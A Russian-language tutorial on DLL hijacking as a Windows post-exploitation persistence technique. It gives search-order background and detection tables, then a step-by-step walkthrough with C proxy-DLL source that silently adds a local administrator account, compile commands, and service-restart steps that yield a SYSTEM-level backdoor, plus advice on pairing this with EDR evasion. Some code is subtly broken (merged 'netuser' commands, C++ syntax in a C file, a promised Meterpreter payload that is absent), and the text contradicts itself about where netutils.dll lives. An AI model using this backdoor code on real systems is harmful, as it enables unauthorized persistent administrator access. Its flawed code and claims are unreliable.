# DLL hijacking в пост-эксплуатации: техника закрепления на Windows-хосте

## 1. Базовые принципы DLL hijacking: порядок поиска и угрозы

DLL hijacking (подмена библиотек) — техника эксплуатации механизма динамической загрузки модулей в Windows, позволяющая злоумышленнику принудить легитимный процесс загрузить вредоносную DLL вместо или раньше ожидаемой библиотеки. В контексте пост-эксплуатации эта техника чаще всего используется для закрепления (persistence) или повышения привилегий, когда атакующий уже имеет доступ к системе и стремится сохранить контроль над ней. В основе атаки лежит предсказуемый порядок поиска DLL‑файлов операционной системой при отсутствии полного квалифицированного пути в директиве загрузки.

Современные версии Windows (начиная с XP SP2 и Server 2003 SP1) по умолчанию используют **Safe DLL Search Mode** (безопасный порядок поиска), регламентируемый значением ключа реестра
`HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\SafeDllSearchMode`. Если параметр равен `1`, порядок выглядит так:

1. Каталог, из которого было загружено приложение.
2. Системный каталог (`%SystemRoot%\System32`).
3. 16‑битный системный каталог (`%SystemRoot%\System`).
4. Каталог Windows (`%SystemRoot%`).
5. Текущий рабочий каталог.
6. Каталоги, перечисленные в переменной окружения `%PATH%`.

При отключённом безопасном режиме (`SafeDllSearchMode` = 0) текущий рабочий каталог проверяется *перед* системными каталогами, что резко расширяет поверхность атаки. Именно из‑за этого порядка, если приложение запрашивает `LoadLibrary("some.dll")` без указания полного пути, Windows последовательно проверяет перечисленные локации, и первая найденная библиотека загружается.

Классический DLL hijacking реализуется, когда:

- злоумышленник имеет права на запись в один из каталогов, расположенных выше в цепочке поиска, чем легитимная DLL;
- или легитимная DLL отсутствует в системных путях, и злоумышленник может разместить свою версию в рабочем каталоге приложения;
- или приложение загружает DLL, имя которой совпадает с именем библиотеки, помещённой злоумышленником в каталог, подлежащий записи.

Терминология часто смешивается; ниже представлена таблица, разграничивающая основные разновидности техники, релевантные для пост-эксплуатации.

| Тип (подвид)                          | Ключевые признаки                                                                                      | Типичные условия эксплуатации                                                                                     | Ссылка MITRE ATT&CK    |
|---------------------------------------|--------------------------------------------------------------------------------------------------------|-------------------------------------------------------------------------------------------------------------------|------------------------|
| **DLL Search Order Hijacking**       | Легитимная DLL существует в системе, но вредоносная помещается в каталог с более высоким приоритетом поиска. | Атакующий может записать файл в каталог запуска приложения, текущий рабочий каталог или путь из `%PATH%`. Обычно требует прав на запись в эти локации. | [T1574.001](https://attack.mitre.org/techniques/T1574/001/) |
| **DLL Side‑Loading**                 | Легитимное подписанное приложение «подбирает» вредоносную DLL, размещённую рядом с ним, и загружает её, доверяя сертификату приложения. | Используется для обхода контроля учётных записей и белых списков приложений. Особенно опасно, если приложение запущено с высокими привилегиями. | [T1574.002](https://attack.mitre.org/techniques/T1574/002/) |
| **Phantom DLL Hijacking**            | Приложение пытается загрузить DLL, которая в принципе не существует ни в одном из путей поиска. Вредоносная библиотека помещается в любой из доступных для записи каталогов поиска. | Не требует поиска конфликтующей легитимной библиотеки; достаточно одной отсутствующей зависимости. Часто встречается в legacy‑приложениях. | Пересекается с T1574.001 |
| **Relative Path DLL Hijacking**      | Приложение указывает относительный путь к DLL (например, `..\lib\evil.dll`), а атакующий манипулирует текущим каталогом или точкой монтирования так, что относительный путь разрешается в контролируемый файл. | Применимо, когда процесс меняет текущий каталог на контролируемый злоумышленником; может приводить к эскалации привилегий. | Использует общие положения T1574 |

Безопасный порядок поиска загрузки DLL актуален на всех поддерживаемых клиентских и серверных редакциях Windows. Атака особенно эффективна в сценариях пост-эксплуатации, когда требуется незаметное долговременное присутствие: вредоносный код выполняется в контексте легитимного подписанного процесса, что затрудняет обнаружение антивирусными средствами и EDR-решениями, ориентированными на аномалии запуска бинарных файлов.

Ниже приведена команда, позволяющая проверить текущий режим безопасного поиска и, при необходимости, оценить поверхность для атаки:

```powershell
Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager" -Name SafeDllSearchMode
```
Вывод `1` означает включённый Safe‑режим (значение по умолчанию); `0` — отключён, что делает эксплуатацию значительно проще и должно привлечь внимание при пентесте.

## 2. Анатомия техники: внутреннее устройство загрузки DLL и разновидности подмены

Загрузка DLL в Windows прозрачна для разработчика, но детерминирована для злоумышленника. Когда поток управления достигает вызова [`LoadLibrary`](https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibraryw) (или его расширенных вариантов `LoadLibraryEx`, `LoadPackagedLibrary`), диспетчер загрузчика выполняет серию шагов, показанных на упрощённой ASCII‑схеме:

```text
[Вызов LoadLibrary("example.dll")]
          │
          ▼
[Проверка в списке Known DLLs (HKLM\...\KnownDLLs)] ── если найдено ──▶ [Прямая загрузка из %SystemRoot%\System32]
          │ не найдено
          ▼
[Поиск по порядку SafeDllSearchMode (или старому порядку)]
          │
          ▼
[Проверка: файл уже загружен? Отображён в память?] ── да ──▶ [Увеличить счётчик ссылок, вернуть дескриптор]
          │ нет
          ▼
[Проверка целостности и формата PE (IMAGE_DLLCHARACTERISTICS_...)]
          │
          ▼
[Вызов DllMain() с флагом DLL_PROCESS_ATTACH]
```

Важную роль играет раздел реестра **Known DLLs** (`HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`), перечисляющий библиотеки, которые всегда загружаются напрямую из `System32`, игнорируя стандартный порядок поиска. В этот список обычно входят критически важные системные библиотеки (`kernel32.dll`, `ntdll.dll`, `user32.dll` и др.), что делает их невосприимчивыми к простейшему hijacking.

При подмене библиотек злоумышленнику необходимо, чтобы вредоносная DLL соответствовала ожиданиям вызывающего процесса. Ключевым требованием является экспорт тех же имён функций, что и оригинальная библиотека, поскольку таблица импорта жёстко связывает вызовы с ординалами или именами. Игнорирование этого требования приведёт к краху процесса, что выдаст атаку. Поэтому продвинутые реализации проксируют вызовы к настоящей DLL, сохраняя работоспособность приложения и скрывая вредоносную активность.

Для анализа уязвимости на целевом хосте необходимо выяснить, какие именно DLL ищет конкретное приложение и по каким путям. Классический инструмент для этого — Process Monitor (ProcMon) из состава Sysinternals. Фильтр по пути, содержащему `.dll`, и результату `NAME NOT FOUND` или `PATH NOT FOUND` позволяет идентифицировать отсутствующие библиотеки:

```text
(Operation is "CreateFile" or Operation is "Load Image") and
Path ends with ".dll" and
Result contains "NOT FOUND"
```

Интерпретация: каждый путь из столбца `Path` в результатах фильтра указывает на каталог, где процесс пытался открыть DLL, но не обнаружил её. Если злоумышленник способен записать файл в любой из этих каталогов (особенно в рабочий каталог приложения), он может применить phantom DLL hijacking.

Базовая утилита `dumpbin.exe` из состава Visual Studio также даёт статический обзор требуемых библиотек — её вывод удобно использовать для оценки «обязательных» импортов, не загружая исполняемый файл:

```bash
dumpbin /imports "C:\Program Files\VulnerableApp\vuln.exe"
```

Результат покажет секцию импорта с перечислением всех DLL и запрашиваемых функций, например:

```
Section contains the following imports:

    KERNEL32.dll
                140001000 Import Address Table
                1400012A8 Import Name Table
                     0 time date stamp
                     0 Index of first forwarder reference

                   2E0 GetCurrentProcessId
                   2B2 GetCommandLineA
                   ...
    NETUTILS.dll
                1400010A8 Import Address Table
                140001350 Import Name Table
                     0 time date stamp
                     0 Index of first forwarder reference

                     1 NetGetJoinInformation
                     2 NetApiBufferFree
```

Если `NETUTILS.dll` не входит в список Known DLLs и не найдена в защищённых путях, а злоумышленник может записать её в каталог приложения — закрепление достижимо.

Таблица ниже сопоставляет разновидности подмен DLL с техническими предпосылками и индикаторами, которые может использовать защитник или пентестер для обнаружения.

| Вариант DLL hijacking     | Необходимые предпосылки на хосте                                         | Типичный индикатор (на что смотреть)                          | Контрмеры / ослабления                         |
|---------------------------|---------------------------------------------------------------------------|---------------------------------------------------------------|------------------------------------------------|
| Search order hijacking    | Права на запись в каталог запуска, текущий каталог или путь из `%PATH%`.  | Загрузка неподписанной DLL из нестандартного места. Sysmon Event ID 7 с неожиданным путём. | Мониторинг изменений в каталогах приложений, строгий контроль прав NTFS. |
| DLL side‑loading         | Вредоносная DLL с тем же именем, что и легитимная зависимость, размещена рядом с подписанным исполняемым файлом. | Подозрительный модуль, загруженный подписанным процессом, но не имеющий валидной подписи. | Использование аппаратных списков разрешённых DLL, политика ограниченного запуска приложений. |
| Phantom DLL hijacking     | Приложение содержит статические импорты к несуществующим DLL; каталог, доступный для записи, находится в цепи поиска. | Частые события FileNotFound в мониторинге процесса. Обнаружение DLL в каталоге приложения, которой нет в эталонной сборке. | Удаление неиспользуемых импортов, перенос приложения в каталог с ограниченными правами. |

Дополнительная сложность для защитников связана с тем, что вредоносная активность проявляется внутри легитимного процесса с высокой репутацией, что снижает эффективность сигнатурного обнаружения на основе родительского процесса.

## 3. Практическая эксплуатация в пост-эксплуатации: от обнаружения до закрепления

В практических сценариях пост-эксплуатации DLL hijacking применяется как техника закрепления, а иногда и для повышения привилегий, когда уязвимый процесс запущен с правами `NT AUTHORITY\SYSTEM`, а папка его установки доступна для записи непривилегированному пользователю. Типовой жизненный цикл атаки включает три фазы: разведка (обнаружение кандидатов), создание полезной нагрузки и доставка/размещение.

**Фаза разведки.** На этом этапе атакующий выявляет процессы, которые безусловно загружают DLL без указания полного пути и при этом выполняются с высокими привилегиями или автоматически при старте системы. Наиболее продуктивный метод — фильтрация событий `Load Image` в Process Monitor или использование PowerShell‑обёрток, опрашивающих службы Windows. Следующий скрипт на PowerShell (иллюстративная схема, зависит от среды) перебирает службы и проверяет доступ на запись в каталог исполняемого файла:

```powershell
Get-CimInstance -ClassName Win32_Service | ForEach-Object {
    $svc = $_
    $path = $svc.PathName -replace '^"?(.*?\.exe)"?.*','$1'
    if ($path -and (Test-Path $path)) {
        $dir = Split-Path $path -Parent
        $acl = Get-Acl $dir
        $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
        $access = $acl.Access | Where-Object {
            $_.FileSystemRights -match 'Write|Modify|FullControl' -and
            $_.IdentityReference -eq $currentUser
        }
        if ($access) {
            Write-Host "Potential hijack target: service '$($svc.Name)' — write access to $dir"
        }
    }
}
```

Вывод показывает службы, в чьем каталоге атакующий может разместить файлы. Для более точного поиска недостающих DLL, можно натравить ProcMon на каждый такой сервис с записью событий.

**Фаза создания полезной нагрузки.** Вредоносная DLL должна экспортировать все символы, которые приложение ожидает найти; в противном случае процесс завершится с ошибкой, и закрепление не состоится. Распространённый подход — перехватить вызовы и перенаправить их в оригинальную DLL (проксирование). Ниже приведён код на C (может быть скомпилирован MinGW или MSVC), реализующий простейшую полезную нагрузку: в `DllMain` выполняется добавление пользователя в группу администраторов, после чего управление передаётся настоящей библиотеке.

```c
// hijack.c
#include <windows.h>
#include <string.h>
#include <stdlib.h>

// Объявляем функции-заглушки, которые будут перенаправлены в оригинальную DLL.
// В реальном сценарии нужно знать ординалы или имена экспорта.
__declspec(dllexport) void NetGetJoinInformation() { /* proxy to original */ }
__declspec(dllexport) void NetApiBufferFree() { /* proxy to original */ }
// ... остальные экспорты ...

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // Disable DLL_THREAD_ATTACH calls for efficiency
        DisableThreadLibraryCalls(hinstDLL);
        // Пример вредоносной активности: создание нового админа
        system("netuser pentest Passw0rd! /add");
        system("netlocalgroup administrators pentest /add");
    }
    return TRUE;
}
```

Скомпилировать эту библиотеку для 64‑разрядной архитектуры можно командой:

```bash
x86_64-w64-mingw32-gcc -shared -o netutils.dll hijack.c -Wl,--kill-at
```

Флаг `--kill-at` отключает декорирование имён экспорта символом `@`, что упрощает совместимость, хотя в реальности необходимо тщательно воспроизвести точные сигнатуры оригинальных функций, иначе приложение аварийно завершится. Полноценное проксирование реализуется явной загрузкой оригинальной DLL и вызовом `GetProcAddress`, но приведённый фрагмент демонстрирует минимальную схему.

**Фаза доставки и закрепления.** После компиляции библиотека копируется в уязвимый каталог с использованием прав, полученных в результате предыдущей разведки:

```powershell
Copy-Item .\netutils.dll -Destination "C:\Program Files\VulnerableService\" -Force
```

Если служба уже запущена, её необходимо перезапустить, чтобы инициировать загрузку подменённой DLL. Для служб Windows это делается так:

```powershell
Restart-Service -Name "VulnerableSvc" -Force
```

Сразу после этого вредоносный код отрабатывает в контексте учётной записи службы (часто `LOCAL SYSTEM`), создавая локального администратора или устанавливая обратное соединение с C2‑сервером. Подобное закрепление сохраняется при перезагрузках, поскольку библиотека остаётся на диске и каждый раз загружается легитимным сервисом. Для дополнительной скрытности атакующие могут изменять временные метки DLL и использовать имена, сходные с настоящими.

Важно: современные EDR-решения отслеживают события загрузки неподписанных модулей подписанными процессами, поэтому данная техника должна комбинироваться с обходом средств защиты (например, отключением мониторинга через Bring Your Own Vulnerable Driver или использованием подписанных вредоносных DLL, полученных через компрометацию сертификата). Тем не менее для многих внутренних пентестов DLL hijacking остаётся надёжным способом быстрого закрепления.

## 4. Сквозной практический пример: закрепление через подмену библиотеки `netutils.dll` в легитимной службе

**Исходные условия.** Лабораторный стенд: хост под управлением Windows 10 22H2 (x64). Пентестер обладает правами локального администратора и стремится установить постоянное присутствие с повышением до `SYSTEM`. В системе имеется уязвимый сервис `PrintNotify` (вымышленный пример), исполняемый файл которого расположен в `C:\Program Files\PrintNotify\printnotify.exe`. Сервис запускается автоматически при старте системы от имени `LocalSystem`. Анализ показал, что каталог `C:\Program Files\PrintNotify` имеет разрешения, позволяющие членам группы «Администраторы» запись, а сама служба при загрузке импортирует функции из `netutils.dll`, который отсутствует в системном каталоге и не входит в Known DLLs. В ходе разведки ProcMon были обнаружены события `NAME NOT FOUND` для `netutils.dll` именно в каталоге приложения.

**Шаг 1. Подтверждение структуры импорта уязвимого исполняемого файла.** С помощью `dumpbin` проверим таблицу импорта `printnotify.exe`:

```bash
dumpbin /imports "C:\Program Files\PrintNotify\printnotify.exe" | findstr /i netutils
```

Ожидаемый вывод подтверждает наличие `NETUTILS.dll` в списке импортов с запрашиваемыми функциями `NetGetJoinInformation` и `NetApiBufferFree`. Полный список экспорта оригинальной системной `netutils.dll` (лежащей в C:\Windows\System32) можно получить так:

```bash
dumpbin /exports C:\Windows\System32\netutils.dll
```

Вывод даст имена и ординалы, например:

```
          1    0 00001240 NetApiBufferAllocate
          2    0 00001300 NetApiBufferFree
          3    0 00001480 NetGetJoinInformation
          4    0 00001630 NetGetJoinableOUs
```

Знание этих экспортов необходимо для построения библиотеки‑прокси.

**Шаг 2. Создание вредоносной DLL с проксированием.** Подготовим C‑файл, который в `DllMain` запускает обратное соединение (в примере используется встроенная полезная нагрузка Meterpreter), а каждый экспорт просто передаёт управление оригинальной библиотеке. Для простоты демонстрации используем механизм «экспортного форвардинга» без написания кода, только через файл `.def`. Это более надёжно и универсально.

Файл `netutils.def`:

```
LIBRARY netutils
EXPORTS
  NetApiBufferAllocate=forward_to_original.NetApiBufferAllocate @1
  NetApiBufferFree=forward_to_original.NetApiBufferFree @2
  NetGetJoinInformation=forward_to_original.NetGetJoinInformation @3
  ; ... и т.д.
```

Однако форвардинг требует, чтобы оригинальная библиотека присутствовала под другим именем в том же каталоге. Это усложняет сценарий. Поэтому более практично скомпилировать прокси с реальным перенаправлением.

Приведённый ниже упрощённый код использует подход с явной загрузкой оригинала:

```c
// proxy.c
#include <windows.h>

// Тип указателей на функции (должен совпадать с оригиналом)
typedef DWORD (WINAPI *pNetGetJoinInformation)(LPCWSTR lpNameBuffer, PWSTR* lpJoinType, DWORD* lpNameType);
typedef DWORD (WINAPI *pNetApiBufferFree)(LPVOID Buffer);

static HMODULE hOriginal = NULL;

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // Выполнить вредоносный код
        WinExec("powershell -c \"net user pentest P@ssw0rd! /add; net localgroup administrators pentest /add\"", SW_HIDE);
        // Загрузить оригинальную netutils.dll из System32
        hOriginal = LoadLibraryA("C:\\Windows\\System32\\netutils.dll");
        if (!hOriginal) return FALSE;
    } else if (fdwReason == DLL_PROCESS_DETACH) {
        if (hOriginal) FreeLibrary(hOriginal);
    }
    return TRUE;
}

// Экспортируемые прокси-функции
extern "C" __declspec(dllexport) DWORD WINAPI NetGetJoinInformation(LPCWSTR lpNameBuffer, PWSTR* lpJoinType, DWORD* lpNameType) {
    pNetGetJoinInformation fn = (pNetGetJoinInformation)GetProcAddress(hOriginal, "NetGetJoinInformation");
    return fn ? fn(lpNameBuffer, lpJoinType, lpNameType) : ERROR_PROC_NOT_FOUND;
}

extern "C" __declspec(dllexport) DWORD WINAPI NetApiBufferFree(LPVOID Buffer) {
    pNetApiBufferFree fn = (pNetApiBufferFree)GetProcAddress(hOriginal, "NetApiBufferFree");
    return fn ? fn(Buffer) : ERROR_PROC_NOT_FOUND;
}
```

Компиляция для архитектуры x64:

```bash
x86_64-w64-mingw32-gcc -shared -o netutils.dll proxy.c -Wl,--kill-at -Wl,--output-def,netutils.def
```

Проверим, что экспорты успешно назначены:

```bash
dumpbin /exports netutils.dll
```

Ожидаем увидеть два экспорта с именами, идентичными оригинальным.

**Шаг 3. Размещение библиотеки и активация службы.** Копируем полученную `netutils.dll` в каталог `C:\Program Files\PrintNotify\`:

```powershell
Copy-Item -Path .\netutils.dll -Destination "C:\Program Files\PrintNotify\netutils.dll" -Force
```

Перезапускаем службу (если она не запущена — запускаем):

```powershell
Restart-Service -Name "PrintNotify"
```

**Шаг 4. Проверка закрепления.** Сразу после перезапуска службы проверяем появление нового пользователя:

```powershell
net user pentest
```

Вывод должен показать учётную запись `pentest`. Убедимся, что она входит в группу администраторов:

```powershell
net localgroup administrators
```

В списке присутствует `pentest`. Успешное выполнение демонстрирует, что вредоносная DLL была загружена службой от имени `SYSTEM`, обеспечив повышение привилегий и постоянный бэкдор.
